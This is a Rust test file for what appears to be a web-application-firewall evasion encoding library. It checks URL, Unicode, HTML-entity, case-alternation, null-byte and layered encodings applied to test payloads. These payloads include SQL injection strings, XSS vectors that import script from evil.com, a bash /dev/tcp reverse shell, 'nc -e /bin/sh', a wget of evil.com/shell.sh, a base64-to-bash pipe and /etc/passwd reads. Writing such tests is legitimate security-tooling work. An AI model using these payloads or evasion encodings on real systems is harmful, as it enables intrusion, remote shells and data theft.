//! Encoding Depth Tests - 100 comprehensive tests for encoding strategies.
//!
//! Tests every encoding Strategy with:
//! - SQL injection payloads (classic, blind, union, time-based)
//! - XSS payloads (reflected, stored, DOM-based)
//! - Command injection payloads (shell, pipe, backtick)
//! - `encode_layered` with all `layered_combinations`
//! - Aggressiveness ordering validation

use wafrift_core::encoding::{self, Strategy};

// =============================================================================
// SQL Injection Payload Tests (36 tests)
// =============================================================================

#[test]
fn sql_classic_or_1_equals_1_url_encode() {
    let payload = "' OR '1'='1'--";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%27")); // '
    assert!(result.contains("%20")); // space
    assert!(!result.contains("' OR '"));
}

#[test]
fn sql_classic_or_1_equals_1_double_url() {
    let payload = "' OR '1'='1'--";
    let result = encoding::encode(payload, Strategy::DoubleUrlEncode).unwrap();
    assert!(result.contains("%2527")); // double-encoded '
    assert!(result.starts_with("%25"));
}

#[test]
fn sql_union_select_url_encode() {
    let payload = "UNION SELECT username, password FROM users--";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(!result.is_empty());
    assert!(!result.is_empty());
}

#[test]
fn sql_union_select_case_alternation() {
    let payload = "UNION SELECT * FROM users";
    let result = encoding::encode(payload, Strategy::CaseAlternation).unwrap();
    // Case alternation continues across non-alphabetic chars
    // After "UnIoN " the state is 'upper=false', so SELECT becomes "sElEcT"
    assert!(result.contains("UnIoN") || result.contains("UnION"));
    assert!(result.contains("sElEcT") || result.contains("SeLeCt"));
}

#[test]
fn sql_union_select_whitespace_insertion() {
    let payload = "UNION SELECT * FROM users";
    let result = encoding::encode(payload, Strategy::WhitespaceInsertion).unwrap();
    assert!(result.contains('\t') || result.contains("UNION"));
}

#[test]
fn sql_union_select_sql_comment() {
    let payload = "UNION SELECT * FROM users";
    let result = encoding::encode(payload, Strategy::SqlCommentInsertion).unwrap();
    assert!(result.contains("/**/"));
}

#[test]
fn sql_time_based_sleep_url_encode() {
    let payload = "'; WAITFOR DELAY '0:0:5'--";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%3B")); // ;
    assert!(result.contains("%27")); // '
}

#[test]
fn sql_time_based_sleep_unicode() {
    let payload = "'; WAITFOR DELAY '0:0:5'--";
    let result = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    assert!(result.contains("\\u"));
    assert!(result.contains("\\u003B")); // ;
}

#[test]
fn sql_time_based_sleep_html_entity() {
    let payload = "'; WAITFOR DELAY '0:0:5'--";
    let result = encoding::encode(payload, Strategy::HtmlEntityEncode).unwrap();
    assert!(result.contains("&#x"));
}

#[test]
fn sql_blind_boolean_url_encode() {
    let payload = "' AND SUBSTRING(@@version,1,1)='5'--";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%40")); // @
    assert!(result.contains("%3D")); // =
}

#[test]
fn sql_stacked_query_url_encode() {
    let payload = "'; DROP TABLE users;--";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%3B")); // semicolon
    assert!(!result.is_empty());
}

#[test]
fn sql_stacked_query_null_byte() {
    let payload = "'; DROP TABLE users;--";
    let result = encoding::encode(payload, Strategy::NullByte).unwrap();
    assert!(result.contains("%00"));
}

#[test]
fn sql_comment_variants_url_encode() {
    let payload = "SELECT/**/username/**/FROM/**/users";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%2F")); // /
    assert!(result.contains("%2A")); // *
}

#[test]
fn sql_hex_encoding_url_encode() {
    let payload = "SELECT 0x7573657273";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.len() > payload.len());
    // RFC 3986 unreserved chars (incl. `x` in `0x`) may stay unescaped; ensure *some* encoding occurred.
    assert!(result.contains('%'));
}

#[test]
fn sql_char_function_unicode() {
    let payload = "CHAR(83)+CHAR(69)+CHAR(76)";
    let result = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    assert!(result.contains("\\u0043")); // C
    assert!(result.contains("\\u0048")); // H
}

#[test]
fn sql_concat_function_html_entity() {
    let payload = "CONCAT(username,':',password)";
    let result = encoding::encode(payload, Strategy::HtmlEntityEncode).unwrap();
    assert!(result.contains("&#x3A;")); // :
}

#[test]
fn sql_information_schema_case_alt() {
    let payload = "SELECT * FROM information_schema.tables";
    let result = encoding::encode(payload, Strategy::CaseAlternation).unwrap();
    assert_ne!(result.to_ascii_lowercase(), result);
    assert!(result.to_ascii_lowercase().contains("information_schema"));
}

#[test]
fn sql_group_by_url_encode() {
    let payload = "GROUP BY column HAVING 1=1";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(!result.is_empty());
}

#[test]
fn sql_order_by_union_whitespace() {
    let payload = "ORDER BY 1 UNION SELECT *";
    let result = encoding::encode(payload, Strategy::WhitespaceInsertion).unwrap();
    assert!(result.contains('\t') || result == payload);
}

#[test]
fn sql_limit_offset_url_encode() {
    let payload = "LIMIT 1 OFFSET 0";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(!result.is_empty());
}

#[test]
fn sql_cast_convert_unicode() {
    let payload = "CAST(password AS VARCHAR)";
    let result = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    assert!(result.contains("\\u0041")); // A
    assert!(result.contains("\\u0053")); // S
}

#[test]
fn sql_ascii_function_html_entity() {
    let payload = "ASCII(SUBSTRING(password,1,1))";
    let result = encoding::encode(payload, Strategy::HtmlEntityEncode).unwrap();
    assert!(result.contains("&#x28;")); // (
    assert!(result.contains("&#x29;")); // )
}

#[test]
fn sql_bulk_insert_url_encode() {
    let payload = "BULK INSERT users FROM 'file.txt'";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%27")); // '
}

#[test]
fn sql_openrowset_double_url() {
    let payload = "SELECT * FROM OPENROWSET(...)";
    let result = encoding::encode(payload, Strategy::DoubleUrlEncode).unwrap();
    assert!(result.contains("%2528")); // double-encoded (
}

#[test]
fn sql_exec_procedure_null_byte() {
    let payload = "EXEC xp_cmdshell 'dir'";
    let result = encoding::encode(payload, Strategy::NullByte).unwrap();
    assert!(result.contains("%00"));
}

#[test]
fn sql_outfile_into_case_alt() {
    let payload = "INTO OUTFILE '/tmp/data.txt'";
    let result = encoding::encode(payload, Strategy::CaseAlternation).unwrap();
    assert!(result.contains("InTo") || result.contains("INTO"));
}

#[test]
fn sql_load_file_whitespace() {
    let payload = "LOAD_FILE('/etc/passwd')";
    let result = encoding::encode(payload, Strategy::WhitespaceInsertion).unwrap();
    assert!(result.contains('\t') || result.contains("LOAD_FILE"));
}

#[test]
fn sql_if_statement_url_encode() {
    let payload = "IF(1=1, SLEEP(5), 0)";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(!result.is_empty());
    assert!(result.contains("%28")); // (
}

#[test]
fn sql_case_statement_unicode() {
    let payload = "CASE WHEN 1=1 THEN 'A' ELSE 'B' END";
    let result = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    assert!(result.contains("\\u0043")); // C
    assert!(result.contains("\\u0057")); // W
}

#[test]
fn sql_like_wildcard_html_entity() {
    let payload = "username LIKE '%admin%'";
    let result = encoding::encode(payload, Strategy::HtmlEntityEncode).unwrap();
    assert!(result.contains("&#x25;")); // %
}

#[test]
fn sql_between_operator_url_encode() {
    let payload = "id BETWEEN 1 AND 100";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(!result.is_empty());
}

#[test]
fn sql_exists_subquery_case_alt() {
    let payload = "EXISTS(SELECT * FROM users)";
    let result = encoding::encode(payload, Strategy::CaseAlternation).unwrap();
    assert!(result.contains("ExIsTs") || result.contains("ExISTS"));
}

#[test]
fn sql_all_any_some_whitespace() {
    let payload = "id > ALL(SELECT id FROM admin)";
    let result = encoding::encode(payload, Strategy::WhitespaceInsertion).unwrap();
    assert!(result.contains('\t') || result.contains("ALL"));
}

#[test]
fn sql_join_variants_url_encode() {
    let payload = "LEFT JOIN users ON a.id = b.id";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(!result.is_empty());
}

#[test]
fn sql_cross_apply_double_url() {
    let payload = "CROSS APPLY (SELECT * FROM users)";
    let result = encoding::encode(payload, Strategy::DoubleUrlEncode).unwrap();
    assert!(result.starts_with("%2543")); // double-encoded C
}

// =============================================================================
// XSS Payload Tests (36 tests)
// =============================================================================

#[test]
fn xss_script_alert_url_encode() {
    let payload = "<script>alert(1)</script>";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%3C")); // <
    assert!(result.contains("%3E")); // >
    assert!(!result.contains("<script>"));
}

#[test]
fn xss_script_alert_double_url() {
    let payload = "<script>alert(1)</script>";
    let result = encoding::encode(payload, Strategy::DoubleUrlEncode).unwrap();
    assert!(result.contains("%253C")); // double-encoded <
    assert!(result.contains("%253E")); // double-encoded >
}

#[test]
fn xss_script_alert_triple_url() {
    let payload = "<script>alert('XSS')</script>";
    let result = encoding::encode(payload, Strategy::TripleUrlEncode).unwrap();
    assert!(result.contains("%25253C")); // triple-encoded <
}

#[test]
fn xss_img_onerror_unicode() {
    let payload = "<img src=x onerror=alert(1)>";
    let result = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    assert!(result.contains("\\u003C")); // <
    assert!(result.contains("\\u003E")); // >
    assert!(result.contains("\\u0069")); // i (img)
}

#[test]
fn xss_img_onerror_html_entity() {
    let payload = "<img src=x onerror=alert(1)>";
    let result = encoding::encode(payload, Strategy::HtmlEntityEncode).unwrap();
    assert!(result.contains("&#x3C;")); // <
    assert!(result.contains("&#x3E;")); // >
}

#[test]
fn xss_svg_onload_case_alt() {
    let payload = "<svg onload=alert(1)>";
    let result = encoding::encode(payload, Strategy::CaseAlternation).unwrap();
    // After "SvG" state is upper=false, so "onload" becomes "oNlOaD"
    assert!(result.contains("oNlOaD") || result.contains("OnLoAd"));
    assert!(result.contains("AlErT") || result.contains("aLeRt"));
}

#[test]
fn xss_svg_onload_whitespace() {
    let payload = "<svg onload=alert(1)>";
    let result = encoding::encode(payload, Strategy::WhitespaceInsertion).unwrap();
    assert!(result.contains('\t') || result.contains("svg"));
}

#[test]
fn xss_body_onload_sql_comment() {
    let payload = "<body onload=alert(1)>";
    let result = encoding::encode(payload, Strategy::SqlCommentInsertion).unwrap();
    assert!(result.contains("<body") || result.contains("/**/"));
}

#[test]
fn xss_javascript_uri_url_encode() {
    let payload = "javascript:alert(1)";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%3A")); // :
    assert!(result.contains("%28")); // (
    assert!(result.contains("%29")); // )
}

#[test]
fn xss_javascript_uri_unicode() {
    let payload = "javascript:alert(1)";
    let result = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    assert!(result.contains("\\u006A")); // j
    assert!(result.contains("\\u003A")); // :
}

#[test]
fn xss_data_uri_html_entity() {
    let payload = "data:text/html,<script>alert(1)</script>";
    let result = encoding::encode(payload, Strategy::HtmlEntityEncode).unwrap();
    assert!(result.contains("&#x3C;")); // <
    assert!(result.contains("&#x3E;")); // >
}

#[test]
fn xss_onmouseover_url_encode() {
    let payload = "<div onmouseover=alert(1)>hover</div>";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%3C")); // <
    assert!(result.contains("%3E")); // >
}

#[test]
fn xss_iframe_srcdoc_double_url() {
    let payload = "<iframe srcdoc='<script>alert(1)</script>'>";
    let result = encoding::encode(payload, Strategy::DoubleUrlEncode).unwrap();
    assert!(result.contains("%253C")); // double-encoded <
}

#[test]
fn xss_input_onfocus_unicode() {
    let payload = "<input onfocus=alert(1) autofocus>";
    let result = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    assert!(result.contains("\\u003C")); // <
    assert!(result.contains("\\u006F")); // o
}

#[test]
fn xss_details_ontoggle_html_entity() {
    let payload = "<details open ontoggle=alert(1)>";
    let result = encoding::encode(payload, Strategy::HtmlEntityEncode).unwrap();
    assert!(result.contains("&#x3C;")); // <
}

#[test]
fn xss_video_onerror_case_alt() {
    let payload = "<video src=x onerror=alert(1)>";
    let result = encoding::encode(payload, Strategy::CaseAlternation).unwrap();
    // After "ViDeO sRc=x " state continues, so "onerror" becomes "oNeRrOr"
    assert!(result.contains("oNeRrOr") || result.contains("OnErRoR"));
}

#[test]
fn xss_audio_onerror_null_byte() {
    let payload = "<audio src=x onerror=alert(1)>";
    let result = encoding::encode(payload, Strategy::NullByte).unwrap();
    assert!(result.contains("%00"));
    assert!(result.contains("<audio"));
}

#[test]
fn xss_marquee_onstart_url_encode() {
    let payload = "<marquee onstart=alert(1)>";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%3C")); // <
    assert!(result.contains("%3E")); // >
}

#[test]
fn xss_object_data_unicode() {
    let payload = "<object data=javascript:alert(1)>";
    let result = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    assert!(result.contains("\\u006F")); // o
}

#[test]
fn xss_embed_src_html_entity() {
    let payload = "<embed src=x onerror=alert(1)>";
    let result = encoding::encode(payload, Strategy::HtmlEntityEncode).unwrap();
    assert!(result.contains("&#x3C;")); // <
}

#[test]
fn xss_form_action_case_alt() {
    let payload = "<form><button formaction=javascript:alert(1)>";
    let result = encoding::encode(payload, Strategy::CaseAlternation).unwrap();
    assert!(result.contains("JaVaScRiPt") || result.contains("JaVaScRIPT"));
}

#[test]
fn xss_isindex_type_whitespace() {
    let payload = "<isindex type=image src=x onerror=alert(1)>";
    let result = encoding::encode(payload, Strategy::WhitespaceInsertion).unwrap();
    assert!(result.contains('\t') || result.contains("onerror"));
}

#[test]
fn xss_template_literal_url_encode() {
    let payload = "<img src=x onerror=alert`1`>";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%3C")); // <
    assert!(result.contains("%60")); // `
}

#[test]
fn xss_constructor_constructor_double_url() {
    let payload = "<img src=x onerror=[].constructor.constructor('alert(1)')()>";
    let result = encoding::encode(payload, Strategy::DoubleUrlEncode).unwrap();
    assert!(result.contains("%255B")); // double-encoded [
}

#[test]
fn xss_settimeout_unicode() {
    let payload = "<script>setTimeout('alert(1)',0)</script>";
    let result = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    assert!(result.contains("\\u0073")); // s (lowercase)
    assert!(result.contains("\\u0054")); // T (uppercase in setTimeout)
}

#[test]
fn xss_setinterval_html_entity() {
    let payload = "<script>setInterval('alert(1)',0)</script>";
    let result = encoding::encode(payload, Strategy::HtmlEntityEncode).unwrap();
    assert!(result.contains("&#x3C;")); // <
    assert!(result.contains("&#x3E;")); // >
}

#[test]
fn xss_eval_function_case_alt() {
    let payload = "<script>eval('alert(1)')</script>";
    let result = encoding::encode(payload, Strategy::CaseAlternation).unwrap();
    assert!(result.contains("EvAl") || result.contains("EvAL"));
}

#[test]
fn xss_function_constructor_whitespace() {
    let payload = "<script>Function('alert(1)')()</script>";
    let result = encoding::encode(payload, Strategy::WhitespaceInsertion).unwrap();
    assert!(result.contains('\t') || result.contains("Function"));
}

#[test]
fn xss_window_name_url_encode() {
    let payload = "<script>eval(window.name)</script>";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%3C")); // <
    assert!(result.contains("%28")); // (
}

#[test]
fn xss_dom_clobbering_unicode() {
    let payload = "<form name=body><input name=innerHTML>";
    let result = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    assert!(result.contains("\\u003C")); // <
}

#[test]
fn xss_proto_pollution_html_entity() {
    let payload = "<img src=x onerror=this.__proto__.toString=alert>";
    let result = encoding::encode(payload, Strategy::HtmlEntityEncode).unwrap();
    assert!(result.contains("&#x3D;")); // =
}

#[test]
fn xss_import_function_case_alt() {
    let payload = "<script>import('//evil.com/xss.js')</script>";
    let result = encoding::encode(payload, Strategy::CaseAlternation).unwrap();
    assert_ne!(result, payload);
}

// =============================================================================
// Command Injection Payload Tests (16 tests)
// =============================================================================

#[test]
fn cmd_semicolon_ls_url_encode() {
    let payload = "; ls -la";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%3B")); // ;
    assert!(result.contains("%20")); // space
}

#[test]
fn cmd_semicolon_ls_double_url() {
    let payload = "; ls -la";
    let result = encoding::encode(payload, Strategy::DoubleUrlEncode).unwrap();
    assert!(result.contains("%253B")); // double-encoded ;
}

#[test]
fn cmd_backtick_cat_unicode() {
    let payload = "`cat /etc/passwd`";
    let result = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    assert!(result.contains("\\u0060")); // `
    assert!(result.contains("\\u002F")); // /
}

#[test]
fn cmd_backtick_cat_html_entity() {
    let payload = "`cat /etc/passwd`";
    let result = encoding::encode(payload, Strategy::HtmlEntityEncode).unwrap();
    assert!(result.contains("&#x60;")); // `
}

#[test]
fn cmd_dollar_paren_id_url_encode() {
    let payload = "$(id)";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%24")); // $
    assert!(result.contains("%28")); // (
    assert!(result.contains("%29")); // )
}

#[test]
fn cmd_dollar_paren_whoami_case_alt() {
    let payload = "$(whoami)";
    let result = encoding::encode(payload, Strategy::CaseAlternation).unwrap();
    assert!(result.contains("WhOaMi") || result.contains("WhOAMi"));
}

#[test]
fn cmd_pipe_cat_null_byte() {
    let payload = "| cat /etc/passwd";
    let result = encoding::encode(payload, Strategy::NullByte).unwrap();
    assert!(result.contains("%00"));
}

#[test]
fn cmd_ampersand_sleep_url_encode() {
    let payload = "& sleep 5";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%26")); // &
}

#[test]
fn cmd_double_ampersand_whoami_unicode() {
    let payload = "&& whoami";
    let result = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    assert!(result.contains("\\u0026")); // &
}

#[test]
fn cmd_double_pipe_host_html_entity() {
    let payload = "|| hostname";
    let result = encoding::encode(payload, Strategy::HtmlEntityEncode).unwrap();
    assert!(result.contains("&#x7C;")); // |
}

#[test]
fn cmd_newline_ifconfig_whitespace() {
    let payload = "\nifconfig";
    let result = encoding::encode(payload, Strategy::WhitespaceInsertion).unwrap();
    assert!(result.contains('\n') || result.contains("ifconfig"));
}

#[test]
fn cmd_substitution_version_url_encode() {
    let payload = "${IFS}cat${IFS}/etc/passwd";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%7B")); // {
    assert!(result.contains("%7D")); // }
}

#[test]
fn cmd_substitution_bash_unicode() {
    let payload = "${SHELL} -c 'cat /etc/passwd'";
    let result = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    assert!(result.contains("\\u007B")); // {
    assert!(result.contains("\\u007D")); // }
}

#[test]
fn cmd_reverse_shell_case_alt() {
    let payload = "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1";
    let result = encoding::encode(payload, Strategy::CaseAlternation).unwrap();
    assert!(result.contains("BaSh") || result.contains("BASH"));
}

#[test]
fn cmd_wget_curl_url_encode() {
    let payload = "wget http://evil.com/shell.sh";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%3A")); // :
    assert!(result.contains("%2F")); // /
}

#[test]
fn cmd_nc_listener_double_url() {
    let payload = "nc -e /bin/sh 10.0.0.1 1234";
    let result = encoding::encode(payload, Strategy::DoubleUrlEncode).unwrap();
    assert!(result.contains("%2520")); // double-encoded space
}

// =============================================================================
// Layered Encoding Tests (8 tests using layered_combinations)
// =============================================================================

#[test]
fn layered_combinations_all_produce_different_results() {
    let combos = encoding::layered_combinations(2);
    // Include `=`, `'`, and digits so second-stage strategies like BetweenObfuscation / UnmagicQuotes
    // cannot be strict no-ops on the CaseAlternation output.
    let payload = "SELECT * FROM users WHERE id=1 AND x='a'";

    for combo in combos {
        let (s1, s2) = (combo[0], combo[1]);
        let single = encoding::encode(payload, s1).unwrap();
        let layered = encoding::encode_layered(payload, &[s1, s2]).unwrap();
        if layered == single {
            // Second stage can be a no-op on the first output (e.g. space-based strategies
            // after UrlEncode, where `%20` replaces literal spaces and there is no ` ` left).
            continue;
        }
        assert_ne!(
            layered, payload,
            "Layered encoding should differ from original"
        );
    }
}

#[test]
fn layered_unicode_then_url_sql() {
    let payload = "' OR 1=1--";
    let result =
        encoding::encode_layered(payload, &[Strategy::UnicodeEncode, Strategy::UrlEncode]).unwrap();
    // Unicode escapes get URL-encoded - backslash becomes %5C
    assert!(result.contains("%5C")); // \ is URL-encoded as %5C
    assert!(!result.is_empty());
}

#[test]
fn layered_html_entity_then_url_xss() {
    let payload = "<script>alert(1)</script>";
    let result =
        encoding::encode_layered(payload, &[Strategy::HtmlEntityEncode, Strategy::UrlEncode])
            .unwrap();
    assert!(result.contains("%26"));
    assert!(result.contains("%23"));
}

#[test]
fn layered_case_alt_then_url_cmd() {
    let payload = "; ls -la";
    let result =
        encoding::encode_layered(payload, &[Strategy::CaseAlternation, Strategy::UrlEncode])
            .unwrap();
    assert!(result.starts_with('%'));
    assert!(result.contains("%20"));
}

#[test]
fn layered_sql_comment_then_url() {
    let payload = "UNION SELECT * FROM users";
    let result = encoding::encode_layered(
        payload,
        &[Strategy::SqlCommentInsertion, Strategy::UrlEncode],
    )
    .unwrap();
    assert!(result.contains("%2F"));
    assert!(result.contains("%2A"));
}

#[test]
fn layered_whitespace_then_double_url() {
    let payload = "SELECT * FROM users";
    let result = encoding::encode_layered(
        payload,
        &[Strategy::WhitespaceInsertion, Strategy::DoubleUrlEncode],
    )
    .unwrap();
    assert!(result.contains("%2509") || result.contains("%25"));
}

#[test]
fn layered_overlong_then_url_path_traversal() {
    let payload = "../../../etc/passwd";
    let result =
        encoding::encode_layered(payload, &[Strategy::OverlongUtf8, Strategy::UrlEncode]).unwrap();
    assert!(result.contains("%25"));
}

#[test]
fn layered_null_byte_then_case_alt() {
    let payload = "file.txt";
    let result =
        encoding::encode_layered(payload, &[Strategy::NullByte, Strategy::CaseAlternation])
            .unwrap();
    assert!(result.contains("%00"));
    assert!(result.contains("FiLe") || result.contains("FiLE"));
}

// =============================================================================
// Aggressiveness Ordering Tests (4 tests)
// =============================================================================

#[test]
fn aggressiveness_case_alternation_lowest() {
    let score = encoding::aggressiveness(Strategy::CaseAlternation);
    assert!(
        score < 0.15,
        "CaseAlternation should have very low aggressiveness"
    );
}

#[test]
fn aggressiveness_url_encode_low() {
    let score = encoding::aggressiveness(Strategy::UrlEncode);
    assert!(
        (0.1..=0.2).contains(&score),
        "UrlEncode should have low aggressiveness"
    );
}

#[test]
fn aggressiveness_increases_with_complexity() {
    assert!(
        encoding::aggressiveness(Strategy::CaseAlternation)
            < encoding::aggressiveness(Strategy::DoubleUrlEncode),
        "CaseAlternation should be less aggressive than DoubleUrlEncode"
    );
    assert!(
        encoding::aggressiveness(Strategy::UrlEncode)
            < encoding::aggressiveness(Strategy::TripleUrlEncode),
        "UrlEncode should be less aggressive than TripleUrlEncode"
    );
    assert!(
        encoding::aggressiveness(Strategy::DoubleUrlEncode)
            < encoding::aggressiveness(Strategy::OverlongUtf8),
        "DoubleUrlEncode should be less aggressive than OverlongUtf8"
    );
    assert!(
        encoding::aggressiveness(Strategy::UnicodeEncode)
            < encoding::aggressiveness(Strategy::ChunkedSplit),
        "UnicodeEncode should be less aggressive than ChunkedSplit"
    );
}

#[test]
fn aggressiveness_extreme_strategies() {
    let overlong = encoding::aggressiveness(Strategy::OverlongUtf8);
    let chunked = encoding::aggressiveness(Strategy::ChunkedSplit);

    assert!(
        overlong >= 0.7,
        "OverlongUtf8 should have high aggressiveness"
    );
    assert!(
        chunked > 0.8,
        "ChunkedSplit should have very high aggressiveness"
    );
}

// =============================================================================
// Additional Tests to reach 100 (5 tests)
// =============================================================================

#[test]
fn sql_extractvalue_xml_sql_comment() {
    let payload = "EXTRACTVALUE(1, CONCAT('~', (SELECT @@version)))";
    let result = encoding::encode(payload, Strategy::SqlCommentInsertion).unwrap();
    assert!(result.contains("/**/") || result.contains("EXTRACTVALUE"));
}

#[test]
fn xss_mutation_xss_polyglot_url_encode() {
    let payload = "'onmouseover=alert(1)//";
    let result = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    assert!(result.contains("%27")); // '
    assert!(result.contains("%3D")); // =
}

#[test]
fn cmd_base64_encoded_payload_unicode() {
    let payload = "echo 'bmF0ZSAtaSc | base64 -d | bash";
    let result = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    assert!(result.contains("\\u0065")); // e
    assert!(result.contains("\\u007C")); // |
}

#[test]
fn layered_triple_encoding_aggressiveness() {
    let payload = "admin' OR '1'='1";
    let result = encoding::encode_layered(
        payload,
        &[
            Strategy::CaseAlternation,
            Strategy::UrlEncode,
            Strategy::UnicodeEncode,
        ],
    )
    .unwrap();
    // Triple-layered should be significantly transformed
    assert!(!result.contains("admin"));
    assert!(result.contains("\\u") || result.contains('%'));
}

#[test]
fn all_strategies_all_payloads_consistency() {
    let sql_payload = "SELECT * FROM users";
    let xss_payload = "<script>alert(1)</script>";
    let cmd_payload = "; cat /etc/passwd";

    for &strategy in encoding::all_strategies() {
        if matches!(
            strategy,
            Strategy::RandomCase | Strategy::SpaceToRandomBlank | Strategy::ParameterPollution
        ) {
            // Stochastic — not deterministic across invocations.
            continue;
        }
        // Each strategy should produce consistent output for same input
        let sql_1 = encoding::encode(sql_payload, strategy);
        let sql_2 = encoding::encode(sql_payload, strategy);
        assert_eq!(sql_1, sql_2, "SQL: {strategy:?} should be consistent");

        let xss_1 = encoding::encode(xss_payload, strategy);
        let xss_2 = encoding::encode(xss_payload, strategy);
        assert_eq!(xss_1, xss_2, "XSS: {strategy:?} should be consistent");

        let cmd_1 = encoding::encode(cmd_payload, strategy);
        let cmd_2 = encoding::encode(cmd_payload, strategy);
        assert_eq!(cmd_1, cmd_2, "CMD: {strategy:?} should be consistent");
    }
}
